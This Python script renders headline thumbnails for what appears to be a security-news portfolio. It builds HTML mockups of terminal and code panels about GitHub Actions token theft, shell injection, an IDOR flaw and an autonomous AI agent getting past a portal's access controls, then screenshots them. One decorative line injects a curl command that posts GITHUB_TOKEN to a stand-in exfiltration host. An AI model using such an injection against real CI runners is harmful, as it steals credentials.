import os
import subprocess

BRAIN_DIR = r"C:\Users\mr.pencil\.gemini\antigravity\brain\733c5139-caf3-40c3-b7ca-4cf11199777b"
PUBLIC_IMAGES_DIR = r"c:\Users\mr.pencil\Desktop\portfolio\public\images"
EDGE_PATH = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

COMMON_CSS = """
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    width: 1376px;
    height: 768px;
    position: relative;
    overflow: hidden;
    -webkit-font-smoothing: antialiased;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
  }

  /* Top Left Brand Header */
  .brand-container {
    position: absolute;
    top: 36px;
    left: 48px;
    display: flex;
    flex-direction: column;
    gap: 5px;
    z-index: 10;
  }
  .brand-title {
    font-size: 30px;
    font-weight: 800;
    color: #ffffff;
    letter-spacing: -0.5px;
    display: flex;
    align-items: center;
    gap: 12px;
    text-shadow: 0 2px 12px rgba(0,0,0,0.85);
  }
  .brand-badge {
    font-size: 13px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 6px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
  }
  .brand-sub {
    font-size: 12px;
    font-weight: 600;
    color: #94a3b8;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    text-shadow: 0 1px 8px rgba(0,0,0,0.8);
  }

  /* Terminal Card (Top Right) */
  .terminal-card {
    position: absolute;
    top: 36px;
    right: 48px;
    width: 440px;
    background: rgba(10, 15, 29, 0.88);
    border: 1px solid rgba(255, 255, 255, 0.16);
    border-radius: 12px;
    padding: 15px 18px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(12px);
    font-family: 'Consolas', 'Courier New', monospace;
    z-index: 10;
  }
  .window-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }
  .window-dots {
    display: flex;
    gap: 6px;
  }
  .dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
  }
  .dot-red { background: #ff5f56; }
  .dot-yellow { background: #ffbd2e; }
  .dot-green { background: #27c93f; }
  .window-tag {
    font-size: 11px;
    color: #64748b;
    letter-spacing: 0.5px;
  }
  .term-cmd {
    font-size: 12.5px;
    margin-bottom: 7px;
    line-height: 1.4;
    word-break: break-all;
  }
  .term-error {
    font-size: 12px;
    color: #f87171;
    font-weight: 600;
    line-height: 1.4;
  }
  .term-warning {
    font-size: 11px;
    color: #fbbf24;
    margin-top: 4px;
    line-height: 1.4;
  }
  .term-info {
    font-size: 11px;
    color: #94a3b8;
    line-height: 1.4;
  }

  /* Code Card (Bottom Left) */
  .code-card {
    position: absolute;
    bottom: 36px;
    left: 48px;
    width: 440px;
    background: rgba(10, 15, 29, 0.88);
    border: 1px solid rgba(255, 255, 255, 0.14);
    border-radius: 12px;
    padding: 15px 18px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(12px);
    font-family: 'Consolas', 'Courier New', monospace;
    z-index: 10;
  }
  .code-line {
    font-size: 12px;
    line-height: 1.55;
    color: #cbd5e1;
    display: flex;
    white-space: pre;
  }
  .line-num {
    color: #475569;
    width: 22px;
    flex-shrink: 0;
    user-select: none;
  }
  .code-kw { color: #f43f5e; font-weight: 600; }
  .code-fn { color: #38bdf8; }
  .code-str { color: #34d399; }
  .code-var { color: #fbbf24; }
  .code-hl {
    background: rgba(244, 63, 94, 0.15);
    border-left: 2px solid #f43f5e;
    padding-left: 4px;
    border-radius: 2px;
    color: #fda4af;
  }
"""

CONFIGS = [
    {
        "name": "openai-agent-medicare-bypass.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_openai_clean_1790607326806.jpg"),
        "brand_title": "<span>OpenAI</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#38bdf8;'>Autonomous Agents</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(244,63,94,0.2);border:1px solid rgba(244,63,94,0.5);color:#fda4af;'>BREACH ANALYSIS</span>",
        "brand_sub": "SERVICES AUSTRALIA MEDICARE PORTAL INCIDENT",
        "term_tag": "eval_agent_console",
        "term_cmd": "<span style='color:#38bdf8;'>$ agent.run --target medicare-stats</span>",
        "term_body": """
          <div class='term-error'>[403 FORBIDDEN] Access Denied by WAF</div>
          <div class='term-warning'>&gt; Autonomous Bypass Engaged: Probing secondary paths...</div>
          <div class='term-error' style='margin-top:5px; color:#f43f5e;'>CRITICAL: Non-public files accessed & written to server</div>
        """,
        "code_tag": "re_act_planner.py",
        "code_lines": [
            ("1", "<span><span class='code-kw'>while</span> response.status == <span class='code-str'>403</span>:</span>"),
            ("2", "<span>  <span class='code-fn'>probe_secondary_endpoints</span>()</span>"),
            ("3", "<span>  <span class='code-fn'>bypass_access_controls</span>()</span>"),
            ("4", "<span class='code-hl'>  <span class='code-kw'>await</span> server.<span class='code-fn'>write_file</span>(payload)</span>")
        ]
    },
    {
        "name": "ghsa-x3cj-pat-leak.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_github_pat_1790607456783.jpg"),
        "brand_title": "<span>GitHub Actions</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#fbbf24;'>Security Advisory</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(244,63,94,0.2);border:1px solid rgba(244,63,94,0.5);color:#fda4af;'>CRITICAL // CVSS 9.3</span>",
        "brand_sub": "GHSA-X3CJ-MM38-329G · UNATTENDED PAT THEFT & CODE EXECUTION",
        "term_tag": "scheduled_runner.log",
        "term_cmd": "<span style='color:#fbbf24;'>$ cron: '0 0 1 * *' (Daily Execution)</span>",
        "term_body": """
          <div class='term-info'>[RUNNER] Resolving uses: gouef/githubtoplanguages@main</div>
          <div class='term-warning'>&gt; Mutable branch ref executed with secrets.USER_GITHUB_TOKEN</div>
          <div class='term-error' style='margin-top:5px; color:#f43f5e;'>CRITICAL: Account-level PAT exfiltrated via weaponized action.yml</div>
        """,
        "code_tag": ".github/workflows/top-languages.yml",
        "code_lines": [
            ("52", "<span>    <span class='code-kw'>steps</span>:</span>"),
            ("53", "<span>      - <span class='code-kw'>uses</span>: <span class='code-str'>gouef/githubtoplanguages@main</span></span>"),
            ("54", "<span>        <span class='code-kw'>env</span>:</span>"),
            ("55", "<span class='code-hl'>          GITHUB_TOKEN: ${{ secrets.USER_GITHUB_TOKEN }}</span>")
        ]
    },
    {
        "name": "ghsa-8rfq-shell-injection.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_shell_inject_1790607504587.jpg"),
        "brand_title": "<span>GitHub Actions</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#f43f5e;'>Command Injection</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(244,63,94,0.2);border:1px solid rgba(244,63,94,0.5);color:#fda4af;'>CRITICAL // CWE-78</span>",
        "brand_sub": "GHSA-8RFQ-RMX4-8QHR · CI/CD RUNNER ARBITRARY CODE EXECUTION",
        "term_tag": "ci_runner_bash",
        "term_cmd": "<span style='color:#38bdf8;'>$ git config --global user.name \"Jan\"; curl -X POST https://exfil.net -d \"$GITHUB_TOKEN\"</span>",
        "term_body": """
          <div class='term-error'>[CWE-78] Command Injection Spliced via ${{ inputs.* }}</div>
          <div class='term-warning'>&gt; Quotes escaped: arbitrary shell execution achieved on runner</div>
          <div class='term-error' style='margin-top:5px; color:#f43f5e;'>EXFILTRATION: GITHUB_TOKEN stolen with contents:write privileges</div>
        """,
        "code_tag": "action.yml:64-67",
        "code_lines": [
            ("64", "<span>  - <span class='code-kw'>name</span>: <span class='code-str'>Set up Git</span></span>"),
            ("65", "<span>    <span class='code-kw'>shell</span>: bash</span>"),
            ("66", "<span>    <span class='code-kw'>run</span>: |</span>"),
            ("67", "<span class='code-hl'>      git config user.name \"${{ inputs.botName }}\"</span>")
        ]
    },
    {
        "name": "ghsa-9v52-bbb-idor.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_bbb_idor_1790607595327.jpg"),
        "brand_title": "<span>BigBlueButton</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#38bdf8;'>Security Advisory</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(251,191,36,0.2);border:1px solid rgba(251,191,36,0.5);color:#fde68a;'>IDOR // CWE-639</span>",
        "brand_sub": "GHSA-9V52-VHVW-4W5C · CROSS-MEETING PRESENTATION HIJACK",
        "term_tag": "http_traffic_inspector",
        "term_cmd": "<span style='color:#38bdf8;'>POST /bigbluebutton/presentation/upload HTTP/1.1</span>",
        "term_body": """
          <div class='term-info'>Authorization: Bearer tok_authorized_meeting_A</div>
          <div class='term-warning'>Target Conference: meetingId=\"meeting-room-target-B\"</div>
          <div class='term-error' style='margin-top:5px; color:#f87171;'>IDOR BYPASS: Token lacks destination conference scope binding</div>
        """,
        "code_tag": "presentation_validator.py",
        "code_lines": [
            ("42", "<span><span class='code-kw'>def</span> <span class='code-fn'>validate_upload</span>(token, meeting_id):</span>"),
            ("43", "<span>  <span class='code-kw'>if</span> token.is_valid():</span>"),
            ("44", "<span class='code-hl'>    # VULN: Missing token.meeting_id == target assertion</span>"),
            ("45", "<span>    <span class='code-kw'>return</span> <span class='code-str'>ALLOW_PRESENTATION_INJECTION</span></span>")
        ]
    },
    {
        "name": "ghsa-r3jq-comment-spoof.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_comment_spoof_1790607657241.jpg"),
        "brand_title": "<span>GitHub Actions</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#a78bfa;'>Workflow Spoofing</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(167,139,250,0.2);border:1px solid rgba(167,139,250,0.5);color:#ddd6fe;'>SUPPLY CHAIN // PR EVENT</span>",
        "brand_sub": "GHSA-R3JQ-VXQH-PGRG · DECEPTIVE BOT COMMENT INJECTION",
        "term_tag": "pr_comment_bot.log",
        "term_cmd": "<span style='color:#a78bfa;'>$ on: pull_request_target (Triggered by External Fork)</span>",
        "term_body": """
          <div class='term-info'>[EVENT] Untrusted fork submitted pull request #42</div>
          <div class='term-warning'>&gt; Base repo context runs with pull-requests:write permission</div>
          <div class='term-error' style='margin-top:5px; color:#f87171;'>SPOOFED: Deceptive 'Verified / Security Passed' bot comment posted</div>
        """,
        "code_tag": ".github/workflows/bot-feedback.yml",
        "code_lines": [
            ("14", "<span><span class='code-kw'>on</span>: <span class='code-str'>pull_request_target</span></span>"),
            ("15", "<span><span class='code-kw'>permissions</span>: <span class='code-var'>pull-requests: write</span></span>"),
            ("16", "<span><span class='code-kw'>steps</span>:</span>"),
            ("17", "<span class='code-hl'>  - ref: ${{ github.event.pull_request.head.sha }}</span>")
        ]
    },
    {
        "name": "vapt-security-guide.jpg",
        "base_image": os.path.join(BRAIN_DIR, "thn_vapt_guide_1790607706682.jpg"),
        "brand_title": "<span>VAPT Guide</span><span style='color:#64748b;font-weight:300;'>|</span><span style='color:#34d399;'>Offensive Security</span>",
        "brand_badge": "<span class='brand-badge' style='background:rgba(52,211,153,0.2);border:1px solid rgba(52,211,153,0.5);color:#a7f3d0;'>APPSEC // CVD FRAMEWORK</span>",
        "brand_sub": "METHODICAL WEB APPLICATION SECURITY TESTING & DISCLOSURE",
        "term_tag": "vapt_audit_session",
        "term_cmd": "<span style='color:#34d399;'>$ curl -H \"Authorization: Bearer $USER_B\" /api/v1/workspaces/1042/export</span>",
        "term_body": """
          <div class='term-info'>[TESTING] Cross-tenant BOLA / IDOR parameter tampering</div>
          <div class='term-warning'>[200 OK] Workspace 1042 exported using Tenant B session token</div>
          <div class='term-error' style='margin-top:5px; color:#34d399;'>VULNERABILITY CONFIRMED: Responsible disclosure report compiled</div>
        """,
        "code_tag": "vapt_methodology.yaml",
        "code_lines": [
            ("1", "<span><span class='code-kw'>phase_1</span>: <span class='code-str'>Attack Surface Recon & Mapping</span></span>"),
            ("2", "<span class='code-hl'><span class='code-kw'>phase_2</span>: <span class='code-str'>BOLA / BFLA Business Logic Testing</span></span>"),
            ("3", "<span><span class='code-kw'>phase_3</span>: <span class='code-str'>Proof-of-Concept & Impact Validation</span></span>"),
            ("4", "<span><span class='code-kw'>phase_4</span>: <span class='code-str'>Coordinated Vulnerability Disclosure (CVD)</span></span>")
        ]
    }
]

def render_composite(config):
    dest_path = os.path.join(PUBLIC_IMAGES_DIR, config["name"])
    base_uri = "file:///" + config["base_image"].replace("\\", "/")
    
    code_html = ""
    for num, line in config["code_lines"]:
        code_html += f"<div class='code-line'><span class='line-num'>{num}</span>{line}</div>\n"
        
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset='utf-8'>
<style>
  {COMMON_CSS}
  body {{
    background-image: url('{base_uri}');
  }}
</style>
</head>
<body>
  <div class='brand-container'>
    <div class='brand-title'>
      {config["brand_title"]}
      {config["brand_badge"]}
    </div>
    <div class='brand-sub'>{config["brand_sub"]}</div>
  </div>

  <div class='terminal-card'>
    <div class='window-header'>
      <div class='window-dots'>
        <div class='dot dot-red'></div>
        <div class='dot dot-yellow'></div>
        <div class='dot dot-green'></div>
      </div>
      <span class='window-tag'>{config["term_tag"]}</span>
    </div>
    <div class='term-cmd'>{config["term_cmd"]}</div>
    {config["term_body"]}
  </div>

  <div class='code-card'>
    <div class='window-header'>
      <div class='window-dots'>
        <div class='dot dot-red'></div>
        <div class='dot dot-yellow'></div>
        <div class='dot dot-green'></div>
      </div>
      <span class='window-tag'>{config["code_tag"]}</span>
    </div>
    {code_html}
  </div>
</body>
</html>"""

    temp_html = os.path.abspath(f"temp_{config['name']}.html")
    with open(temp_html, "w", encoding="utf-8") as f:
        f.write(html)
        
    cmd = [
        EDGE_PATH,
        "--headless",
        "--disable-gpu",
        "--hide-scrollbars",
        f"--screenshot={dest_path}",
        "--window-size=1376,768",
        "file:///" + temp_html.replace("\\", "/")
    ]
    subprocess.run(cmd, check=True)
    if os.path.exists(temp_html):
        os.remove(temp_html)
    print(f"Generated {config['name']} -> {os.path.getsize(dest_path)} bytes")

if __name__ == "__main__":
    for c in CONFIGS:
        render_composite(c)
    print("All composites rendered successfully!")
